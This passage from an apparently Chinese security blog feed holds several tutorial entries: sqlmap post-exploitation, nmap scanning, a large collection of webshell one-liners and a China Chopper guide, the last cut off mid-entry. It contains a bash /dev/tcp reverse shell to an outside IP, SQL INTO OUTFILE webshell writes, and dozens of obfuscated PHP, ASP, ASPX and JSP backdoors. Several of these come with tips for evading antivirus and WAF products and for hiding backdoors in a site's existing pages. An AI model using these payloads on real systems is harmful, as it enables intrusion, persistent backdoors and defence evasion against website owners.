alt="img"></p><p>图2获取os-shell</p><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p>3.执行命令</p><p> 针对相应的系统执行一些命令来验证是否真正获取shell，如图3所示，执行cat &#x2F;etc&#x2F;passwd命令来查看passwd文件内容，在本例中成功获取shell。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790522.jpeg" alt="img"></p><p>图3执行命令</p><h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><p>4.获取反弹shell</p><p>虽然通过sqlmap获取了shell，但shell中操作不方便，可以在具备独立IP的服务器上执行：</p><p> nc –vv –l –p 8080</p><p>在sqlmap的shell段执行：</p><p>bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;24.11.123.222&#x2F;8080 0&gt;&amp;1</p><p>说明：</p><p>（1）24.11.123.222为独立IP</p><p>（2）需要在24.11.123.222上执行上面的nc监听命令</p><p>（3）24.11.123.222服务器需要对8080端口放行，或者在防火墙中开放8080端口，如图4所示，成功反弹shell。</p><p><img src="/../pic/sqlmap.assets/2019102916231769.jpg" alt="img"></p><p>图4成功反弹shell</p><h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><p>5.在服务器上生成webshell</p><p>  在反弹的shell中通过执行locate *.php命令来定位服务器网页的真实路径，然后到该路径下，通过echo命令生成webshell，如图5所示，直接通过echo命令生成webshell一句话后门。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790523.jpeg" alt="img"></p><p>图5生成webshell一句话后门文件</p><h3 id="-7"><a href="#-7" class="headerlink" title=""></a></h3><p>6.获取webshell</p><p>使用中国菜刀一句话后面管理器创建记录并连接，如图6所示，成功获取webshell。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790524.jpeg" alt="img"></p><p>图6获取webshell</p><h3 id="-8"><a href="#-8" class="headerlink" title=""></a></h3><p>7.通过phpmyadmin生成一句话</p><p>如图7所示，通过phpmyadmin登录后台后，在sql查询中执行命令：</p><blockquote><p>select ‘<?php @eval($_POST[cmd]);?>’INTOOUTFILE ‘&#x2F;data&#x2F;www&#x2F;phpmyadmin&#x2F;eval.php’</p><p>注意：通过phpmyadmin生成一句话需要知道网站的真实路径。可以通过查看数据库表以及phpinfo，登录后台，出错等来获取真实路径地址。</p></blockquote><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790525.jpeg" alt="img"></p><p>图7通过phpmyadmin获取webshell</p><h3 id="-9"><a href="#-9" class="headerlink" title=""></a></h3><p>8.通过msf反弹获取shell</p><p>本意是通过msfvenom命令生成msf反弹网页木马，通过msf获取shell，并进行提权，如图8所示，执行后，成功获取shell但真正能够通过msf进行提权成功的很少。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790526.jpeg" alt="img"></p><p>图8msf反弹获取shell</p><h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><p>9.msf提权参考</p><p>（1）msf提权参考</p><p>通过msf反弹shell，执行background将session放在后台运行，然后搜索可以利用的exploit来进行测试。下面是一些可以供参考的命令：</p><blockquote><p>background</p><p>search “关键字”&#x2F;&#x2F;seach ssh seach “&#x2F;exploit&#x2F;linux&#x2F;local”</p><p>use exploit&#x2F;linux……</p><p>show options</p><p>set session 1</p><p>exploit</p><p>sessions -i 1</p><p>getuid</p></blockquote><p> 在msf平台上面执行search后，查找的结果中选择时间较新和excellent的成功提权的几率比较大，在提权前，最好更新msf到最新版本，另外一个搜索exploit的命令为：</p><blockquote><p>searchsploit  linux local 2.6.32 </p></blockquote><p>​     </p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nmap详细使用教程</title>
      <link href="/2023/03/26/nmap/"/>
      <url>/2023/03/26/nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>扫描主机的「开放端口」，在nmap后面直接跟主机IP（默认扫描1000个端口）</p><pre><code class="text">nmap 192.168.31.180</code></pre><p><img src="/../pic/nmap.assets/v2-899d1953b32b1973b1321db94149f7eb_720w.webp" alt="img"></p><p>从上图可以看到：它用1.58秒扫描了1000个端口，其中991个端口关闭，结果中列出的9个端口就是开放的端口。</p><h2 id="1-指定端口"><a href="#1-指定端口" class="headerlink" title="1. 指定端口"></a>1. 指定端口</h2><p>扫描「指定端口」，使用 <code>-p</code> 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</p><pre><code class="text">nmap 192.168.31.180 -p 80nmap 192.168.31.180 -p 1-80nmap 192.168.31.180 -p 80,3389,22,21nmap 192.168.31.180 -p 1-65535nmap 192.168.31.180 -p-    # -p- 等价于 -p 1-65535</code></pre><p><img src="/../pic/nmap.assets/v2-577c8dd29320b0c1817490995e05dcb1_720w.webp" alt="img"></p><h2 id="2-指定扫描方式"><a href="#2-指定扫描方式" class="headerlink" title="2. 指定扫描方式"></a>2. 指定扫描方式</h2><p>我们通过kali中的「wireshark」抓包分析不同扫描方式的请求信息，从而判断这些方式的区别。</p><p>点开kali的左上角，输入 wireshark 单击打开，选择抓包的网卡（我这里是 eth0 ）。</p><p><img src="/../pic/nmap.assets/v2-4df9ca1ad03042d69054e491ddb162c1_720w.webp" alt="img"></p><p>输入过滤条件<code>ip.addr == 192.168.31.180 and tcp.port == 80</code>后，点击箭头应用。</p><p><img src="/../pic/nmap.assets/v2-51cafa1107edd4ac52fc834573aed494_720w.webp" alt="img"></p><p>这个过滤条件的意思是：过滤IP地址是 192.168.31.180 并且 端口是 TCP的80端口。</p><p>设置完过滤条件后，我们在命令行执行扫描命令，然后查看「wireshark」中的请求包。</p><h3 id="2-1-TCP全连接扫描"><a href="#2-1-TCP全连接扫描" class="headerlink" title="2.1 TCP全连接扫描"></a>2.1 TCP全连接扫描</h3><p>使用 <code>-sT</code> 参数进行TCP全连接扫描。</p><p>「全连接扫描」使用完整的三次握手建立链接，能够建立链接就判定端口开放，否则判定端口关闭。</p><pre><code class="text">nmap 192.168.31.180 -p 80 -sT</code></pre><p>1）如果端口开放，就会进行完整的三次握手，成功建立链接，扫描结果中，STATE字段显示为 open 。</p><p><img src="/../pic/nmap.assets/v2-35a809ca5123af1fd4792badf0ac3e0d_720w.webp" alt="img"></p><p>2）如果端口关闭，就只能进行一次握手，无法建立链接，扫描结果中，STATE字段显示为 closed。</p><p><img src="/../pic/nmap.assets/v2-aeeec8f7be4794356f42983ddf1132bf_720w.webp" alt="img"></p><h3 id="2-2-SYN半链接扫描"><a href="#2-2-SYN半链接扫描" class="headerlink" title="2.2 SYN半链接扫描"></a>2.2 SYN半链接扫描</h3><p>使用 <code>-sS</code> 参数进行SYN半链接扫描。</p><p>「半链接扫描」只进行两次握手，对方返回确认帧（ACK&#x3D;1）就判定端口开放，否则判定端口关闭。</p><pre><code class="text">nmap 192.168.31.180 -p 80 -sS</code></pre><p>1）如果端口开放，就会进行两次握手，扫描结果中，STATE字段为 open 。</p><p><img src="/../pic/nmap.assets/v2-f11a8d1b3c4ce79640251cf00af12ccc_720w.webp" alt="img"></p><p>2）如果端口关闭，就只有一次握手，扫描结果中，STATE字段为 closed。</p><p><img src="/../pic/nmap.assets/v2-56045c24f2924772025d52ffdb2ae712_720w.webp" alt="img"></p><h3 id="2-3-隐秘扫描"><a href="#2-3-隐秘扫描" class="headerlink" title="2.3 隐秘扫描"></a>2.3 隐秘扫描</h3><p>隐秘扫描，只适用于Linux系统。</p><p>「隐秘扫描」向目标主机的端口发送TCP FIN包 或 Xmas tree包 或 Null包，如果收到RST响应包，就判定端口关闭，否则就判定端口开放或被屏蔽（open&#x2F;filtered）</p><pre><code class="text">nmap 127.0.0.1 -p 80 -sF  # Fin扫描nmap 127.0.0.1 -p 80 -sN  # Null扫描（所有flags都为0的TCP包）nmap 127.0.0.1 -p 80 -sX  # Xmas扫描（flags的FIN、URG、PUSH都为1的包）</code></pre><h2 id="二、主机探测"><a href="#二、主机探测" class="headerlink" title="二、主机探测"></a>二、主机探测</h2><p>扫描网段中有哪些主机在线，使用 <code>-sP</code> 参数，不扫描端口，只扫描「存活主机」。</p><p>本质上是Ping扫描，能Ping通有回包，就判定主机在线。</p><pre><code class="text">nmap -sP 192.168.31.0/24</code></pre><p>从上图可以看到：它用2秒扫描了这个网段的256个IP，其中有3个存活主机，效率还是蛮不错的。</p><h2 id="三、服务识别"><a href="#三、服务识别" class="headerlink" title="三、服务识别"></a>三、服务识别</h2><p>扫描端口时，默认显示端口对应的服务，但不显示服务版本。</p><p>想要识别具体的「服务版本」，可以使用 <code>-sV</code> 参数。</p><pre><code class="text">nmap 192.168.31.180 -p 80 -sV</code></pre><p><img src="/../pic/nmap.assets/v2-4291b24e38f657f2ce2ae7726edf4c2f_720w.webp" alt="img"></p><p>扫描结果中，VERSION字段显示服务的详细版本。</p><h2 id="四、系统识别"><a href="#四、系统识别" class="headerlink" title="四、系统识别"></a>四、系统识别</h2><p>想要识别「操作系统版本」，可以使用 <code>-O</code> 参数。</p><pre><code class="text">nmap 192.168.31.180 -p 80 -O</code></pre><p><img src="/../pic/nmap.assets/v2-243cb84d63b0b910845f8e8fa90ef5d4_720w.webp" alt="img"></p><p>提示：</p><ol><li>Nmap扫描出的系统版本并完全准确，仅供参考。</li><li>当识别不出具体版本时，Nmap会以概率的形式列举出可能的操作系统，如上图所示。</li></ol><h2 id="五、扫描结果导出"><a href="#五、扫描结果导出" class="headerlink" title="五、扫描结果导出"></a>五、扫描结果导出</h2><p>Nmap的扫描结果可以保存到文件中，比如文本格式、XML格式。</p><p>1）将扫描结果导出为「文本格式」，结果原样保存。</p><pre><code class="text">nmap 192.168.31.180 -p 80 -oN result.txt</code></pre><p><img src="/../pic/nmap.assets/v2-f699c2944a075e459b7081b111950953_720w.webp" alt="img"></p><p>2）将扫描结果导出为「xml格式」，结果的保存格式会发生变化。</p><pre><code class="text">nmap 192.168.31.180 -p 80 -oX result.xml</code></pre><p><img src="/../pic/nmap.assets/v2-d1d745487370c9aaa0b59d860c398d4e_720w.webp" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一句话木马</title>
      <link href="/2023/03/26/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>/2023/03/26/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><pre><code class="text">目录PHP    普通一句话    PHP系列    过狗一句话    PHP过狗    几个变性的php--过防火墙    phpv9 高版本拿shellASP    asp 一句话    ASP过安全狗一句话    ASPX系列    aspx一句话JSP    过护卫神的插入一句话容易爆错    一句话木马到两句话木马的转型! 一句话免杀：    一：变形法支持变异菜刀连接以过安全狗,过啊D 文件扫描的一句话    ASP    ASP    ASPX</code></pre><p><strong>PHP</strong></p><pre><code class="text">&lt;pre&gt; &lt;body&gt;&lt;? @system($_GET[&quot;cc&quot;]); ?&gt;&lt;/body&gt; &lt;/pre&gt;      </code></pre><p>&#x2F;&#x2F;可执行命令一句话</p><p><strong>普通一句话</strong></p><pre><code class="text">&lt;?php eval($_POST[cc123]) ?&gt;&lt;?php @eval($_POST[&#39;cc123&#39;]);?&gt;</code></pre><p><strong>PHP系列</strong></p><pre><code class="text">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;xindong&quot;]); ?&gt;&lt;?php $lang = (string)key($_POST);$lang($_POST[&#39;xindong&#39;]);?&gt;&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k($&#123;&quot;_PO&quot;.&quot;ST&quot;&#125; [&#39;xindong&#39;]);?&gt;&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[&quot;xindong&quot;]);  ?&gt;&lt;?php                  @$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;                  @$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;                  @$_/*-/*-*/($/*-/*-*/&#123;&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;&#125;                  [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?&gt;    密码是  -7</code></pre><p><strong>过狗一句话</strong></p><pre><code class="text">select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; into outfile &#39;C:/Inetpub/wwwroot/mysql-php/1.php&#39;&lt;?php $_=&quot;&quot;; $_[+$_]++; $_=$_.&quot;&quot;; $___=$_[+&quot;&quot;];//A $____=$___; $____++;//B $_____=$____; $_____++;//C $______=$_____; $______++;//D $_______=$______; $_______++;//E $________=$_______; $________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O $_________=$________; $_________++;$_________++;$_________++;$_________++;//S $_=$____.$___.$_________.$_______.&#39;6&#39;.&#39;4&#39;.&#39;_&#39;.$______.$_______.$_____.$________.$______.$_______; $________++;$________++;$________++;//R $_____=$_________; $_____++;//T $__=$___.$_________.$_________.$_______.$________.$_____; $__($_(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;)); ?&gt; &lt;?php $_REQUEST[&#39;a&#39;]($_REQUEST[&#39;b&#39;]); ?&gt; &lt;?php $t=$_GET[&#39;t&#39;]; $tt=$_GET[&#39;tt&#39;]; $s=t;$s($REQUEST[′cc123′]);?&gt;&lt;?php$t=$GET[′t′];//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=sert$s=t;$s($REQUEST[′cc123′]);?&gt;&lt;?php$t=$GET[′t′];//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=sert$s=t.$ttt; $s($_REQUEST[&#39;cc&#39;]);?&gt; &lt;?php $t=$_GET[&#39;t&#39;]; //t=tt $tt=$_GET[&#39;tt&#39;]; //tt=as $ttt=$_GET[&#39;ttt&#39;]; //ttt=s $tttt=$_GET[&#39;tttt&#39;]; //ttt=ert $s=t.$ttt.$tttt;$s($REQUEST[′cc′]);?&gt;&lt;?php$t=$GET[′t′];//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=tttt$tttt=$GET[′tttt′];//ttt=sert$s=t.$ttt.$tttt;$s($REQUEST[′cc′]);?&gt;&lt;?php$t=$GET[′t′];//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=tttt$tttt=$GET[′tttt′];//ttt=sert$s=t.ttt;$s($REQUEST[′cc′]);?&gt;&lt;?php$a=$REQUEST[′a′];//a=b;$b=$REQUEST[′b′];//b=as;$c=$REQUEST[′c′];//c=sert;$d=$REQUEST[′d′];//d=c;$e=ttt;$s($REQUEST[′cc′]);?&gt;&lt;?php$a=$REQUEST[′a′];//a=b;$b=$REQUEST[′b′];//b=as;$c=$REQUEST[′c′];//c=sert;$d=$REQUEST[′d′];//d=c;$e=a.d;$e($REQUEST[′cc′]);?&gt;&lt;?php$a=$REQUEST[′a′];//a=assert;$b=$REQUEST[′b′];//b=a;$d=d;$e($REQUEST[′cc′]);?&gt;&lt;?php$a=$REQUEST[′a′];//a=assert;$b=$REQUEST[′b′];//b=a;$d=b; $d($_REQUEST[&#39;cc&#39;]); ?&gt;PHP过狗&lt;?php if($_POST[x]!=&#39;&#39;)&#123;$a=&quot;base64_decode&quot;; eval($a($_POST[z0]));&#125;?&gt; 密码：x&lt;%a=request(“gold”)%&gt;&lt;%eval a%&gt;fuck&lt;?phpeval($_POST[a])?&gt;&lt;?php $a=range(1,200);$b=chr($a[96]).chr($a[114]).chr($a[114]).chr($a[100]).chr($a[113]).chr($a[115]); $b($&#123;chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83])&#125;[chr($a[51])]); ?&gt; 密码 4该日志目录不存在或权限不足，请检查设置！&lt;?phpeval($_POST[a])?&gt;</code></pre><p><strong>几个变性的php–过防火墙</strong></p><p>过狗效果都不错：</p><pre><code class="text">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;sz&quot;]); ?&gt; &lt;?php $lang = (string)key($_POST);$lang($_POST[&#39;sz&#39;]); ?&gt; &lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k($&#123;&quot;_PO&quot;.&quot;ST&quot;&#125; [&#39;sz&#39;]);?&gt; &lt;?php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[&quot;sz&quot;]); ?&gt;这个是90发的&lt;?php@$_=“s”.“s”./-/-/“e”./-/-/“r”;@= / ∗ − / ∗ − ∗ / &amp;quot; a &amp;quot; . / ∗ − / ∗ − ∗ / _=/*-/*-*/&amp;quot;a&amp;quot;./*-/*-*/ = /∗−/∗−∗/&quot;a&quot;./∗−/∗−∗/_./-/-*/“t”;@/ ∗ − / ∗ − ∗ / ( _/*-/*-*/( / ∗−/∗−∗/(/-/-/&#123;&quot;_P&quot;./-/-/“OS”./-/-*/“T”&#125;[/-/-/0/-/-/-/-/-/2/-/-/-/-/-/5/-/-/]);?&gt;</code></pre><p>密码-7</p><p><strong>phpv9 高版本拿shell</strong></p><pre><code class="text">&lt;?php file_put_contents(&#39;c7.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUW2NjMjc4OV0pOz8+&#39;)); ?&gt;…/…/…/…/html/special/cc/index</code></pre><p><strong>ASP</strong></p><p><strong>asp 一句话</strong></p><pre><code class="text">&lt;%execute(request(“cmd”))%&gt;&lt;%execute request(“1”)%&gt;ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾 密码a&quot;%&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%’ p&lt;%Y=request(“xindong”)%&gt; &lt;%execute(Y)%&gt;&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%&gt;&lt;%eval&quot;&quot;&amp;(“e”&amp;“v”&amp;“a”&amp;“l”&amp;&quot;(&quot;&amp;“r”&amp;“e”&amp;“q”&amp;“u”&amp;“e”&amp;“s”&amp;“t”&amp;&quot;(&quot;&amp;“0”&amp;&quot;-&quot;&amp;“2”&amp;&quot;-&quot;&amp;“5”&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;（密码是-7）</code></pre><p><strong>ASP过安全狗一句话</strong></p><pre><code class="text">密码（pass）&lt;% %&gt;&lt;%a=request(“zl”)%&gt;&lt;%eval a%&gt;</code></pre><p><strong>ASPX系列</strong></p><p>ASPX一句话的 过安全狗效果不怎么样</p><p>不过我认为能支持aspx 百分之8&#x2F;90支持asp</p><pre><code class="text">&lt;%@ Page Language = Jscript %&gt;&lt;%var/-/-/P/-/-/=/-/-/“e”+“v”+/-/-/“a”+“l”+&quot;(&quot;+“R”+“e”+/-/-/“q”+“u”+“e”/-/-/+“s”+“t”+“[/-/-/0/-/-/-/-/-/2/-/-/-/-/-/5/-/-/]”+“,”+&quot;&quot;&quot;+“u”+“n”+“s”/-/-/+“a”+“f”+“e”+&quot;&quot;&quot;+&quot;)&quot;;eval(/-/-/P/-/-/,/-/-/“u”+“n”+“s”/-/-/+“a”+“f”+“e”/-/-/);%&gt; 密码 -7&lt;%@ Page Language=“Jscript”%&gt;&lt;%eval(Request.Item[“xindong”],“unsafe”);%&gt;密码是webadmin</code></pre><p><strong>aspx一句话</strong></p><pre><code class="text">&lt;%@ Page Language=“Jscript” validateRequest=“false” %&gt;&lt;%Response.Write(eval(Request.Item[“w”],“unsafe”));%&gt;</code></pre><p><strong>JSP</strong></p><pre><code class="text">&lt;%if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;select ‘&lt;?php eval($_POST[cmd];?&gt;’ into outfile ‘C:/Inetpub/wwwroot/mysql-php/1.php’</code></pre><p><strong>过护卫神的</strong></p><p>&lt;%E&#x3D;request(“1”)%&gt;abc</p><p>123456789&lt;%execute E%&gt;</p><p>原来代码是&lt;%execute request(“cmd”)%&gt; 把标签修改替换下来 为</p><p>&lt;scriptlanguage&#x3D;VBScript runat&#x3D;server&gt;execute request(“cmd”) 这样就避开了&lt;%,%&gt;符号！</p><p>表中数据段限制，一句话木马也写不下的情况</p><p>网络中流传的最小的木马代码是&lt;%eval request(“#”)%&gt; 如过连这也写不下怎么办？</p><p>将木马分开写就好了！&lt;%Y&#x3D;request(“x”)%&gt; &lt;%execute(Y)%&gt; 这样分开写提交到数据库就没问题了！</p><p>不过，在ACCESS数据库中新增加的数据物理位置是在旧数据之前的，所以要先写&lt;%execute(Y)%&gt;部分。写好后在客户端写密码时除了填写”x”以外的任何字符都可以，如果填了”x”就会出错！</p><p><strong>插入一句话容易爆错</strong></p><p>例如</p><pre><code class="text">Sub unlockPost()Dim id,replyid,rs,posttableid=Request(“id”)replyid=Request(“replyid”)If Not IsNumeric(id) or id=&quot;&quot; Then</code></pre><p>写成</p><pre><code class="text">Sub unlockPost(&lt;%eval request(&quot;#&quot;)%&gt;)Dim id,replyid,rs,posttableid=Request(“id”)replyid=Request(“replyid”)If Not IsNumeric(id) or id=&quot;&quot; Then</code></pre><p>就可以了，也可以写成带容错语句的格式！！</p><pre><code class="text">&lt;%if request(“cmd”)&lt;&gt;&quot;&quot;then execute request(“cmd”)%&gt;</code></pre><p><strong>一句话木马到两句话木马的转型!</strong></p><p>一句话木马服务端原型:&lt;%execute request(“value”)%&gt; ,</p><p>变形后:&lt;%On Error Resume Next execute request(“value”)%&gt; ,</p><p>至于为什么要用两句话木马呢,是由于使我们的后门更加隐蔽.</p><p>我也试过用一句话插入WellShell的某个ASP文件里面,可是访问时经常出错,而插入两句话木马服务端却可以正常访问了,对站点的页面无任何影响.</p><p>这样就达到了隐蔽性更强的目的了,他管理员总不会连自己的网页文件都删了吧.</p><p>现在我的WellShell都有这样的后门.选择要插入两句话木马的ASP文件要注意,选一些可以用IE访问的ASP文件,不要选conn.asp这样的文件来插入.</p><p>当然,连接两句话木马的客户端仍然是用一句木马的客户端,不用修改.</p><p><strong>一句话免杀：</strong></p><p><strong>一：变形法</strong></p><p>比如：eval(request(“#”))这样的马儿呢，一般情况下是不被杀的。但实际上，经常杀毒软件会把eval(request列为特征码。所以我们变形一下</p><pre><code class="text">E=request(“id”)eval(E)</code></pre><p>这样可达到免杀的目的。</p><p>例如：&lt;%execute request(“1”)%&gt; 变形后：</p><pre><code class="text">&lt;%E=request(“1”)execute E%&gt;</code></pre><p>当然，这种变形是最好做的。</p><p>介绍第二种方法：因为很多管理员很聪明，它会检查ASP文件中的execute和eval函数。所以呢，不管你怎么反编译，它最终总是要用其中的一个函数来解释运行，所以还是被发现了。好么，我们用外部文件来调用。建一个a.jpg或者任何不被发现的文件后缀或文件名。写入 execute(request(“#”))当然，你可以先变形后现放上去。然后在ASP文件中插入</p><p>来引用它，即可。</p><p>不过，管理员可以通过对比文件的方式找到修改过的文件，不过这种情况不多。</p><p>在WEBSHeLL中使用命令提示</p><p>在使用ASP站长助手6.0时点击命令提示符显示“没有权限”的时候，可以使用ASP站长助手上传CMD.exe到你的WEBSHELL目录（其它目录也行，把上传以后的CMD.exe绝对路径COPY出来），再修改你的WEBSHELL找到调用CMD.EXE的代码。原来的代码如下</p><pre><code class="text">.exec(&quot;cmd.exe /c &quot;&amp;DefCmd).stdout.readall</code></pre><p>修改为</p><p>.exec(“你想上传的cmd.exe绝对路径” &#x2F;c”&amp;DefCmd).stdout.readall</p><p>比如你上传到的目录是D：\web\www\cmd.exe,那么就修改成</p><p>.exec(“D：\web\www\cmd.exe &#x2F;c”&amp;DefCmd).stdout.readall</p><p><strong>支持变异菜刀连接以过安全狗,过啊D 文件扫描的一句话</strong></p><p>实已经不是一句话了，好几句了都。</p><p>继续上次的：我使用的一句话的几种姿态</p><p>这回研究了下PHP，发一下我使用的一句话（可过文件扫描）。</p><p><strong>ASP</strong></p><pre><code class="text">&lt;?php $mujj = $_POST[&#39;z&#39;]; if ($mujj!=&quot;&quot;) &#123; $xsser=base64_decode($_POST[&#39;z0&#39;]); @eval(&quot;\$safedg = $xsser;&quot;); &#125; ?&gt;</code></pre><p>密码z，支持菜刀连接；支持变异菜刀连接以过安全狗。</p><p>另外：</p><p><strong>ASP</strong></p><pre><code class="text">&lt;% Function MorfiCoder(Code) MorfiCoder=Replace(Replace(StrReverse(Code),&quot;//&quot;,&quot;&quot;&quot;&quot;),&quot;*&quot;,vbCrlf)End FunctionExecute MorfiCoder(&quot;)//z/*/(tseuqer lave&quot;) %&gt;</code></pre><p><strong>ASPX</strong></p><pre><code class="text">&lt;% popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(&quot;UmVxdWVzdC5JdGVtWyJ6Il0=&quot;)))); %&gt;</code></pre><p>分享是交流的关键，我不喜欢什么大马 小马 一句话是我的最爱，不仅隐藏性高 免杀效果好 而且无后门（当然排除菜刀有） —- 没禁用一句话post的情况下。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>菜刀教程</title>
      <link href="/2023/03/26/%E8%8F%9C%E5%88%80/"/>
      <url>/2023/03/26/%E8%8F%9C%E5%88%80/</url>
      
        <content type="html"><![CDATA[<h1 id="中国菜刀（chopper）功能介绍及使用教程"><a href="#中国菜刀（chopper）功能介绍及使用教程" class="headerlink" title="中国菜刀（chopper）功能介绍及使用教程"></a>中国菜刀（chopper）功能介绍及使用教程</h1><p>中国菜刀(下载地址：)是一个非常好用而又强大的webshell，它可不是用来切菜的做饭的道具哦，是一款专业的网站管理软件，大小只有300多KB，真是小巧实用啊！不过被不法分子利用到，就是一个黑站的利器了。我记得以前接触的时候摸索了好久才会用，哈哈。。后来领悟之后才发现并不难操作，同时功能也比我想象的要强大。</p><p>注：单独的菜刀没有效果，需要服务器端有一句话后门，或漏洞，例如这样的</p><p>:89&#x2F;mingfang&#x2F;index.php?q&#x3D;${${@eval%28$_POST[cmd]%29}}</p><p>配置图：</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/95174e3dd634804786c4c5f14ed68abb.gif" alt="95174e3dd634804786c4c5f14ed68abb.gif"></p><p>1.中国菜刀支持的服务端脚本：PHP、ASP、asp.net；</p><p>2.主要功能有：文件管理(有足够的权限时候可以管理整个磁盘&#x2F;文件系统)，数据库管理，虚拟终端。</p><p>3.菜刀的工作原理是：利用上传到服务器的一句话脚本再通过一些添加配置就可以工作了。</p><p>今天我只介绍PHP的方法(其他的大同小异)。</p><p>首先：我们首先要新建一个php文件，文件名随意取，然后写入一句代码：</p><p>；eval()这个函数大家并不陌生吧，就是把里面的字符串作为PHP代码执行。最后把这个文件保存，上传到你站点里面，可以是根目录，也可以是其他，都行的。如下图：</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/58d160552d1e46ddae0891bdba3cc159.png" alt="58d160552d1e46ddae0891bdba3cc159.png"></p><p>第二步：打开菜刀这个软件，进入如下界面，右键点击“添加”；如下图：</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/121b3fed6cf05ded69e4fa4891f0157a.png" alt="121b3fed6cf05ded69e4fa4891f0157a.png"></p><p>第三步：此时会弹出一个添加shell的对话框，由图一看出我的 “dxr.php”上传在站点根目录，所以这里的地址填为： 。地址后面的小框框里面的“ee”就是你的“口令”，也就是</p><p>这里的“ee”。下面配置项如果你知道用户名密码就填，不知道，不填，也不会影响文件管理和虚拟终端这两个功能，只是不能查看数据库了。</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/3317cd7f5865f7def40b2857b79b18e9.png" alt="3317cd7f5865f7def40b2857b79b18e9.png"></p><p>最后：点击“添加”按钮，成功后就会产生一条新的记录，鼠标右键点击就可以进行操作了，如下图，可以进行文件管理，数据库管理，虚拟终端。哈哈…大功告成！！</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/4aa6d8eec19fb60cb9b686306911e064.png" alt="4aa6d8eec19fb60cb9b686306911e064.png"></p><p>所以很多黑站者利用一些网站漏洞，上传一句话木马后，就基本上可以黑下你的站了。中国菜刀，就是这么强大！！</p><p>操作效果截图一：</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/9bffc4d9be2d2eed6de85dd2cbfb1eb1.png" 